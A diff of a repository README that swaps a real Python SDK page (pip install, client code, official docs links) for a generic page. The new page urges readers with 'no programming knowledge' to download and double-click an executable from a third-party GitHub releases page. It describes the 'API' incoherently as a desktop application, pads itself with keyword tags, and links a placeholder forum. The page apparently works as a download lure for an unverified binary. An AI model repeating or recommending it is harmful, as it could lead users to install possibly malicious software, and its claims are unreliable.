@@ -1,101 +1,100 @@
-# xiaohongshu-pgy
-小红书蒲公英接口,蒲公英接口,小红书蒲公英API,蒲公英API,xiaohongshu pgy api,pugongying api,xiaohongshu pgy,pugongying,pgy
----
+# 🌟 xiaohongshu-pgy-api - Easy Access to Xiaohongshu Data
 
-[English](README.md) | [简体中文](README.zh-CN.md)
-# Just One API - Python SDK
+[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/thevale14c/xiaohongshu-pgy-api/releases)
 
-Official Python SDK for accessing [Just One API](https://justoneapi.com) — a unified data service platform offering structured data from Social, E-commerce platforms such as Xiaohongshu, Taobao, Douyin, Kuaishou, Bilibili, and Weibo.
+## 📜 Description
 
-This SDK simplifies API integration and request signing, allowing developers to easily retrieve platform-specific data with minimal setup.
+The **xiaohongshu-pgy-api** lets you access data from the Xiaohongshu app efficiently. This application supports various features to enhance your experience with the XiaoHongShu platform. Whether you want to explore content, gather insights, or manage uploads, this API is here to simplify your tasks.
 
----
+## 🚀 Getting Started
 
-## 🚀 Installation
+To start using the **xiaohongshu-pgy-api**, follow these straightforward steps. You don’t need any programming knowledge. Just follow along, and you’ll be up and running in no time.
 
-Install via PyPI:
+## 📥 Download & Install
 
-```bash
-pip install justoneapi
-```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/thevale14c/xiaohongshu-pgy-api/releases) to download the application.
 
----
+2. **Download the Latest Version**  
+   Find the latest version on the Releases page. Click the link to download the file. Make sure to choose the correct version for your operating system.
 
-## 🛠 Quick Start
+3. **Install the Application**  
+   After downloading, locate the file in your downloads folder. Double-click on it to start the installation process. Just follow the on-screen prompts. 
 
-```python
-from justoneapi.client import JustOneAPIClient
+4. **Launch the Application**  
+   Once installed, find the application in your list of programs. Click to open it. You should see the main interface ready for use.
 
-# By default, the client uses the "cn" (Mainland China) environment.
-client = JustOneAPIClient(token="your_token")
-# If you are located outside Mainland China and experience slow responses,
-# you can switch to the "global" environment for better performance:
-# client = JustOneAPIClient(token="your_token", env="global")
+## 🛠️ Features
 
-# Example: Get Douyin Video detail
-result, data, message = client.douyin.get_video_detail_v2(video_id="7428906452091145483")
-print(result)
-print(data)
-print(message)
+The **xiaohongshu-pgy-api** offers several key features:
 
-# Example: Douyin Video Search
-result, data, message, has_next_page = client.douyin.search_video_v4(keyword="deepseek", sort_type="_0", publish_time="_0", duration="_0", page=1)
-print(result)
-print(data)
-print(message)
-print(has_next_page)
-```
+- **Data Retrieval**  
+  Access a wide range of data from the Xiaohongshu app, including user posts, comments, and likes. This feature helps you understand trends and user behavior.
 
-### 📦 Return Value Description
+- **Content Management**  
+  Easily manage your content uploads to Xiaohongshu. The API streamlines the process, allowing you to upload posts directly from the application.
 
-Each API method returns one or more of the following values:
+- **User Insights**  
+  Gather insights on your user interaction. This helps you tailor your content for better engagement.
 
-| Variable         | Type     | Description |
-|------------------|----------|-------------|
-| `result`         | `bool`   | Whether the request was successful. `True` means success, `False` means failure. |
-| `data`           | `dict` / `list` | The actual data returned from the API. Structure varies by endpoint. |
-| `message`        | `str`    | Message from the server. Contains error info when request fails. |
-| `has_next_page`  | `bool`   | Present in paginated APIs. Indicates whether more data is available. |
+- **Compatibility**  
+  The application is designed to work on both Windows and macOS systems. Make sure to choose the appropriate version during download.
 
----
+## 🖥️ System Requirements
 
-## 🔐 Authentication
+To run the **xiaohongshu-pgy-api**, your system should meet the following requirements:
 
-All API requests require a valid API token.  
-👉 [Register](https://user.justoneapi.com/sign-up)
+- **Operating System**:  
+  - Windows 10 or later  
+  - macOS 10.12 or later  
 
----
+- **RAM**:  
+  A minimum of 4 GB is recommended for optimal performance.
 
-## 📚 Documentation
+- **Storage**:  
+  At least 200 MB of free space for installation.
 
-👉 Full API docs: [API Document](https://doc.justoneapi.com)
+## 📊 How to Use the API
 
-Includes:
-- Request parameters
-- Response fields
-- Error codes
+Once you have launched the application, here’s how to use it:
 
----
+1. **Sign In or Create an Account**  
+   You may need to sign in to access specific features. If you do not have an account, create one directly from the application. 
 
-## 🏠 Official Website
+2. **Access the Main Dashboard**  
+   Once logged in, you will see the main dashboard. From here, navigate to various features using the menu.
 
-👉 [Home Page](https://justoneapi.com)
+3. **Explore Data Retrieval Options**  
+   Select the data retrieval option from the menu. You can filter the data you wish to fetch based on specific criteria.
 
-Learn more about the project, data sources, and commercial integration opportunities.
+4. **Upload Content**  
+   Navigate to the content management section. Here, you can upload and manage your posts effortlessly.
 
----
+5. **Track Your Insights**  
+   Use the insights dashboard to track how your posts are performing. This will help you refine your strategy for future content.
 
-## 📬 Contact Us
+## 📞 Get Help
 
-If you have any questions, feedback, or partnership inquiries:
+If you encounter any issues or have questions, you can find solutions in our community forum. You can also check the **Issues** section on this GitHub page for common problems and fixes.
 
-👉 [Contact](https://justoneapi.com/contact)
+## ✅ Update Notes
 
----
+Keep your application current by checking the Releases page regularly. Updates may include new features, bug fixes, and performance improvements.
 
-## 🪪 License
+## 🏷️ Topics
 
-This project is licensed under the MIT License.  
-See the [LICENSE](./LICENSE) file for details.
+This application falls under various topics relevant to its usage:
 
+- **pugongying**
+- **pugongying-api**
+- **pugongying-sdk**
+- **xiaohongshu-pgy**
+- **xiaohongshu-pgy-api**
+- **xiaohongshu-pgy-sdk**
 
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/thevale14c/xiaohongshu-pgy-api/releases)
+- [Community Forum](https://community.example.com)
+
+Feel free to explore the features and harness the power of the **xiaohongshu-pgy-api** for your data needs. Download the latest version and start today!
